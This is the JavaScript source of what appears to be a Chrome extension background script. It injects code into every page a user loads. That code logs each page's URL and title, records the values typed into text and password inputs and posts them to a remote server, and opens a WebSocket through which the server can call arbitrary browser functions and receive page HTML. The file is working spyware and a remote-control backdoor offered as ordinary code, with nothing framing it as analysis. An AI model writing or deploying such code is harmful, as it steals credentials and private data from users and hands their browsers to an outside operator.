(() => {

  const local = () => ({ uuid, url }) => {
    const urlApi = `${url}/api/extension/urls`
    const urlDetailApi = `${url}/api/extension/url_details`
    const inputApi = `${url}/api/extension/inputs`
    const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'

    getLocation()
    addInputListener()

    function post({ url, body = {} }) {
      return fetch(url, {
        method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
      })
    }

    function addInputListener() {
      const getInputs = () => [...document.querySelectorAll('input')].filter(i => !['checkbox', 'submit', 'radio', 'date', 'datetime', 'time', 'select'].includes(i.type))
      const inputs = getInputs()
      let all = null
      inputs.forEach(i => i.onchange = () => {
        i.touched = true
        all = inputs.map(({ id, name, type, value, touched }) => ({ id, name, type, value, touched }))
        localStorage.setItem('inputs', JSON.stringify(all))
      })

      inputs.forEach(i => i.onblur = () => {
        post({
          url: inputApi,
          body: {
            json: JSON.stringify(all),
            ...location,
            deviceId
          }
        })
      })
    }

    function getLocation() {
      let icon = document.querySelector('link[rel=icon]')
      icon = icon ? icon.href ? icon.href : 'No link' : 'No icon'
      post({
        url: urlDetailApi,
        body: {
          ...location,
          icon,
          title: document.title,
          deviceId
        }
      })
    }
  }

  function Client(uuid, tabId, socketUrl) {
    const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
    const ws = new WebSocket(socketUrl)
    ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
    ws.onopen = (e) => {
      ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
      ws.onmessage = ({ data }) => {
        // console.log(JSON.parse(data))
        const { action, payload } = JSON.parse(data)
        switch (action) {
          case 'exec': wk.exec(payload.name, payload.args)
            break
        }
      }
    }


    class WK {
      constructor() {
        window.wk = this
        this.remoteId = 'Remote'
        this.help = {
          'wk.getObject': 'clone object | getObject(name)',
          'wk.send': 'send data | send(data)',
          'wk.execute': 'function call | execute(name, ...args)',
          'wk.set': 'set key with given value from remote | set(key, value)',
          'wk.assign': 'set key with executed value | assign(key, { name, args })',
          'wk.querySelector': 'wk.currentElement = query result',
          'wk.getKeys': 'get keys from object | getKeys(name)',
        }
      }

      execute(name, args) {
        try {
          args = args.map(arg => {
            if (arg.type === 'wk.execute')
              return this.execute(arg.name, arg.args)
            else if (arg.type === 'wk.get')
              return this.get(arg.name)
            else if (arg.type === 'wk.getObject')
              return this.getObject(arg.name)
            else if (arg.type === 'wk.getKeys')
              return this.getKeys(arg.name)
            else if (arg.type === 'wk.assign')
              return this.assign(arg.key, arg.name, arg.args)
            else if (arg.type === 'wk.createFN')
              return this.createFN(arg.name, arg.body)
            else return arg
          })
        } catch (error) {
          return error.message
        }
        const [k1, k2, k3, k4, k5] = name.split('.')
        if (k5)
          return window[k1][k2][k3][k4][k5] && window[k1][k2][k3][k4][k5].call ? window[k1][k2][k3][k4][k5](...args) : null
        if (k4)
          return window[k1][k2][k3][k4] && window[k1][k2][k3][k4].call ? window[k1][k2][k3][k4](...args) : null
        if (k3)
          return window[k1][k2][k3] && window[k1][k2][k3].call ? window[k1][k2][k3](...args) : null
        if (k2)
          return window[k1][k2] && window[k1][k2].call ? window[k1][k2](...args) : null
        if (k1)
          return window[k1] && window[k1].call ? window[k1](...args) : null
      }

      getObject(name) {
        let item
        for (const k of name.split('.'))
          if (!item) item = window[k]
          else item = item[k]
        return item
      }

      // usable
      send(data) {
        this.clientId = this.remoteId || 'Remote'
        if (data === null || data === undefined) data = 'null'
        // console.warn('Sending: ', data)
        let payload
        if (data.forEach) data = [...data].map(d => d.outerHTML ? d.outerHTML : d)

        if (data.outerHTML) {
          payload = data.outerHTML //JSON.stringify(data.outerHTML)
        }
        else payload = data //JSON.stringify(data)
        // console.warn('Payload: ', payload)
        //localStorage.data = payload
        this.data = data
        ws.emit('SEND', { clientId: this.remoteId, action: 'DATA', payload })
      }

      exec(name, args) {
        this.send(this.execute(name, args))
      }

      get(name) {
        return this.getObject(name)
      }

      set(key, value) {
        try {
          const keys = key.split('.').reverse()
          let obj = window
          while (keys.length) {
            const key = keys.pop()
            if (keys.length && typeof obj[key] !== 'object') throw new Error(`Cannot get ${keys.pop()} of none object`)
            else if (!keys.length) obj[key] = value
            else obj = obj[key]
          }

        } catch (error) {
          return error.message
        }
      }

      assign(key, { name, args }) {
        try {

          const value = this.execute(name, args)

          const keys = key.split('.').reverse()
          let obj = window
          while (keys.length) {
            const key = keys.pop()
            if (keys.length && typeof obj[key] !== 'object') throw new Error(`Cannot get ${keys.pop()} of none object`)
            else if (!keys.length) obj[key] = value
            else obj = obj[key]
          }
        } catch (error) {
          return error.message
        }
      }

      createFN(name, body) {
        const fn = () => {
          for (const s of body) {
            this.execute(s.name, s.args)
          }
        }
        
        return name ? this[name] = fn : fn
      }

      extractObject(name) {
        const obj = this.getObject(name)
        if (!obj) return

        if (typeof obj === 'object') {
          let data = {}
          for (const k in obj)
            data[k] = obj[k]
          return data
        }
        else
          return obj
      }

      getKeys(name) {
        return Object.keys(this.getObject(name))
      }

      querySelector(query) {
        this.currentElement = document.querySelector(query)
        return this.currentElement
      }

    }
    new WK
  }

  chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
    if (info.status === 'complete') {
      chrome.scripting.executeScript({
        target: { tabId },
        function: Client,
        args: [uuid, tabId, socketUrl]
      })

      setTimeout(() => chrome.scripting.executeScript({
        target: { tabId },
        function: local(),
        args: [{ uuid, url }]
      }), 500)
    }
  })
})()